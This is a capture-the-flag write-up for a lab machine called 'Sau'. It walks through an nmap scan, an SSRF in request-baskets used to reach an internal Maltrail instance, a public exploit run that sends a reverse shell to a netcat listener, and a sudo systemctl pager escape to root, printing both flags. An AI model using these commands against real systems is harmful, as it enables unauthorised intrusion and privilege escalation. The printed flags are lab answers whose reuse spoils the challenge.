# Sau

We start the usual way: aggressively introducing ourselves to every port on the box:

```shellscript
$ nmap -sC -sV 10.129.54.85 -T5 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-23 09:06 CST
Nmap scan report for 10.129.54.85
Host is up (0.0090s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Fri, 23 Jan 2026 15:07:09 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Fri, 23 Jan 2026 15:06:44 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Fri, 23 Jan 2026 15:06:44 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.94SVN%I=7%D=1/23%Time=69738E84%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/htm
SF:l;\x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Fri,\x2023\x20Jan\
SF:x202026\x2015:06:44\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\
SF:"/web\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection
SF::\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x
SF:20200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Fri,\x2023\x20Jan\
SF:x202026\x2015:06:44\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequ
SF:est,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pla
SF:in;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reque
SF:st")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r
SF:\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r
SF:\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,6
SF:7,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x
SF:20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%
SF:r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\
SF:r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Opti
SF:ons:\x20nosniff\r\nDate:\x20Fri,\x2023\x20Jan\x202026\x2015:07:09\x20GM
SF:T\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20
SF:name\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}
SF:\$\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
SF:close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.91 seconds

```

Nmap does its thing and reports back:

* 22/tcp (SSH) is open — OpenSSH 8.2p1 on Ubuntu. Classic.
* 80/tcp is… filtered. Cool. Love being ignored.
* 8338/tcp also filtered. Even cooler.
* 55555/tcp is open and acting _weird_.

And by “weird” I mean it’s speaking HTTP and casually throwing phrases like:  `invalid basket name` . Let’s visit it in the browser:

<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

A quick look tells us what we’re dealing with: `requests-baskets v1.2.1`. So naturally… we google it. And yes — jackpot: SSRF vulnerability.

The exploit idea is simple:

* Create a basket
* Configure it to forward requests
* Use that forwarding to poke internal services

Basically: make the server browse the internet for us. So we set a forward URL in the basket config (like the exploit describes), then browse to the basket.

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And suddenly… the machine starts showing us what’s running internally on port 80, even though port 80 was filtered from the outside. Filtered ports hate this one weird trick. And guess what? it’s `Maltrail v0.53`. A quick search drops us straight onto a PoC: [https://github.com/spookier/Maltrail-v0.53-Exploit?tab=readme-ov-file](https://github.com/spookier/Maltrail-v0.53-Exploit?tab=readme-ov-file). (Yes, the internet continues to be a treasure trove of bad decisions).

The PoC uses a Python script. We run it like this:

```shellscript
$ python3 exploit.py 10.10.15.84 1337 http://10.129.229.26:55555/p68tiu4
Running exploit on http://10.129.229.26:55555/p68tiu4/login
```

And before we send the exploit, we do the most important ritual in hacking: Open a netcat listener and pray.

```shellscript
$ nc -vnlp 1337
listening on [any] 1337 ...
```

Then…

```shellscript
connect to [10.10.15.84] from (UNKNOWN) [10.129.229.26] 42974
$ whoami
whoami
puma
```

OH?

OH YES.

We’re in as puma. Not root yet, but we’ve officially breached the perimeter. Let’s grab the user flag before we get carried away.

```shellscript
$ cd /home/puma
cd /home/puma
$ cat user.txt
cat user.txt
4232b8764ffaf0b3986a682497d1a2b7
$ 
```

> **User flag:** 4232b8764ffaf0b3986a682497d1a2b7

One flag down. One to go. Now comes the classic question: Sudo check: “what are you allowed to do, puma?”:

```shellscript
$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

```

NOPASSWD? systemctl? as root? That’s not a permission. That’s a confession.

People think `systemctl status` is harmless because it “only shows output”. But it opens the output in a pager (like `less`). And pagers are basically tiny escape rooms where `/bin/bash` is the prize. So we run:

```shellscript
puma@sau:/tmp$ sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
```

It pops into the pager and we see:

```shellscript
WARNING: terminal is not fully functional
```

Translation: “This is going to be messy… but it will absolutely work”. Now inside the pager, we escape to a shell (the classic move):

```shellscript
! /bin/bash
```

And suddenly:

```bash
root@sau:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

We are root. Just like that. systemctl really said: “You want admin? Say less.”

```shellscript
root@sau:/tmp# cat /root/root.txt
a9f97db498a5a405711ba112cdc44f42
```

> **Root flag:** a9f97db498a5a405711ba112cdc44f42
